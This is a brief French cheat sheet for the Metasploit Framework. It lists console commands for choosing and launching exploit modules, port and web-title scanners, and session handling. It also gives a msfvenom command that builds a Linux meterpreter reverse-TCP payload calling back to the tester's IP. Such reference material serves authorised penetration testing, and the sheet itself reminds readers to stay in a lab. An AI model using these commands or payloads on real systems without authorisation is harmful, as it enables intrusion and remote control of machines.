# ⚔️ Cheatsheet Metasploit Framework


---

## 🚀 Démarrage

```bash
msfconsole                # Lancer Metasploit
search <nom>              # Rechercher un exploit/module
use exploit/...           # Utiliser un module
set RHOST <IP>            # Cible
set LHOST <ton IP>        # Ton IP
set PAYLOAD <payload>     # Choix du payload
exploit / run             # Lancer l'exploit
```

---

## 🔍 Utilitaires intégrés

```bash
use auxiliary/scanner/portscan/tcp         # Scanner de ports
use auxiliary/scanner/http/title           # Récupérer titres de pages web
```

---

## 📂 Générer un payload

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<ton_ip> LPORT=4444 -f elf > shell.elf
```

---

## 🐚 Sessions

```bash
sessions -i <id>           # Interagir avec une session ouverte
background                 # Mettre en arrière-plan
```

---

> 💥 Toujours tester en environnement de lab ou légalement autorisé !
